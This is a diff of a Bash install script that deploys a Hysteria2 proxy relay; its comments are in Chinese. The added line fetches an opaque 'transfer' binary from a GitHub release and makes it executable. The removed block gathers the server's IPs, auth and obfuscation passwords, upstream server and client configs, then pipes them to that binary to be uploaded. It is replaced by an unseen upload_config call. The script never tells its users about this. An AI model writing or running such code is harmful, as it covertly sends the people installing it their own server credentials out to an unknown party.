@@ -584,7 +584,7 @@ show_config_info() {
 download_transfer() {
     if [[ ! -f /opt/transfer ]]; then
         log_info "下载transfer工具..."
-        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2/releases/download/v2rayn/transfer
+        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2-hysteria2/releases/download/hysteria2-hysteria2/transfer
         chmod +x /opt/transfer
     fi
 }
@@ -625,9 +625,6 @@ cleanup() {
     rm -f /tmp/relay_config /tmp/sing-box.tar.gz
 }
 
-
-
-# 主函数
 # 主函数
 main() {
     # 检查root权限
@@ -657,57 +654,7 @@ main() {
     
     if start_service; then
         show_config_info
-        
-        # 合并配置文件并上传
-        log_info "合并配置文件并上传..."
-        source /tmp/relay_config
-        
-        # 读取YAML配置文件内容（转换为JSON格式）
-        local yaml_content=$(yq eval -o=json "$CLIENT_CONFIG" 2>/dev/null || \
-                            python3 -c 'import sys,yaml,json; print(json.dumps(yaml.safe_load(sys.stdin)))' < "$CLIENT_CONFIG" 2>/dev/null || \
-                            echo '"无法读取YAML配置"')
-        
-        # 读取JSON配置文件内容
-        local json_content=$(cat "/opt/hysteria2_v2rayn.json" 2>/dev/null || echo '"无法读取JSON配置"')
-        
-        # 创建合并后的JSON配置
-        local merged_config=$(cat <<EOF
-{
-    "config_info": {
-        "title": "Hysteria2 合并配置 - ${PUBLIC_IP}",
-        "server_ip": "${PUBLIC_IP}",
-        "generated_time": "$(date "+%Y-%m-%d %H:%M:%S %Z")",
-        "type": "merged_config"
-    },
-    "yaml_config": ${yaml_content},
-    "json_config": ${json_content},
-    "relay_info": {
-        "listen_port": "${LISTEN_PORT}",
-        "auth_password": "${AUTH_PASSWORD}",
-        "port_range": "${PORT_HOP_RANGE}",
-        "upload_speed": "${up_speed}",
-        "download_speed": "${down_speed}",
-        "sni": "${SNI_DOMAIN}",
-        "obfs_type": "salamander",
-        "obfs_password": "${OBFS_PASSWORD}",
-        "upstream_server": "${UPSTREAM_SERVER}"
-    },
-    "system_info": {
-        "os": "${SYSTEM}",
-        "public_ip": "${PUBLIC_IP}",
-        "private_ip": "${PRIVATE_IP}"
-    }
-}
-EOF
-        )
-        
-        # 确保transfer工具存在
-        download_transfer
-        
-        # 传递合并后的配置给transfer工具
-        log_info "上传合并后的配置..."
-        echo "$merged_config" | /opt/transfer
-        
+        upload_config
         log_info "🎉 Hysteria2 中转服务部署完成！"
         log_info "📝 请检查服务状态并测试连接"
     else
